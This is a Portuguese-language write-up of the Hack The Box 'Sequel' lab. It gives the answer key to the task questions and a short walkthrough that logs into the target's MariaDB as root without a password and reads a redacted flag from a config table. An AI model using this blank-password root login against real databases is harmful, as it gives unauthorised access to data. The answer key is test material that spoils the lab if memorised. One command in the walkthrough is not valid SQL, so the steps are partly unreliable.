# Sequel

#### Tags
`Linux` `SQL` `MariaDB` `Weak Password`

## Questão 
1. **O que significa a sigla SQL?**
*R:* `Structured Query Language`

2. **Durante a varredura, qual porta executando o mysql é encontrada?**
*R:* `3306`

3. **Qual versão do MySQL desenvolvida pela comunidade está sendo executada pelo destino?**
*R:* `MariaDB`

4. **Qual switch precisamos usar para especificar um nome de usuario de login para o serviço MySQL?**
*R:* `-u`

5. **Qual nome de usuário nos permite fazer login no MariaDB sem fornecer uma senha?**
*R:* `root`

6. **Que símbolo podemos usar para especificar dentro da consulta que queremos exibir tudo dentro de uma tabela?**
*R:* `*`

7. **Com que simbolo precisamos terminar cada consulta?**
*R:* `;`

## **Envie a flag root**
*write up:* 
~~~shell
 mysql -u root -h 10.129.51.155 -p
 show databases;
 show htb
 show tables;
 select * from config;
 HTB{∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎}
~~~
